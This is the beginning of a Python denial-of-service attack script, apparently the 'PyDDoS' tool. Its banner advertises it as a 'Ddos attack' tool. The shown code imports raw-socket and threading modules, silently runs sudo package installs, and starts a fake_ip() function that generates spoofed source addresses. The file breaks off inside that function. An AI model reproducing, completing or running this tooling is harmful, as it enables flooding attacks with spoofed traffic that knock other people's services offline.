version= '3.0'
title = '''

      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                                    
 DDos python script | Script used for testing ddos | Ddos attack     
 Author: ___T7hM1___                                                
 Github: http://github.com/t7hm1/pyddos                             
 Version:'''+version+''' 
'''

import re
import os
import sys
import json
import time
import string
import signal
import  http.client,urllib.parse
from random import *
from socket import *
from struct import *
from threading import *
from argparse import ArgumentParser,RawTextHelpFormatter

if os.name == 'posix':
	c = os.system('which pip')
	if c == 256:
		os.system('sudo apt-get install python-pip')
	else:
		pass
else:
	print ('[-] Check your pip installer')

try:
	import requests,colorama
	from termcolor import colored,cprint
except:
	try:
		if os.name == 'posix':
			os.system('sudo pip install colorama termcolor requests')
			sys.exit('[+] I have installed necessary modules for you')
		elif os.name == 'nt':
			os.system('pip install colorama requests termcolor')
			sys.exit('[+] I have installed nessecary modules for you')
		else:
			sys.exit('[-] Download and install necessary modules')
	except Exception as e:
		print ('[-]',e)
if os.name == 'nt':
	colorama.init()

signal.signal(signal.SIGFPE,signal.SIG_DFL)

def fake_ip():
	while True:
		ips = [str(randrange(0,256)) for i in range(4)]
		if ips[0] == "127":
			continue
		fkip = '.'.join(ips)
		break
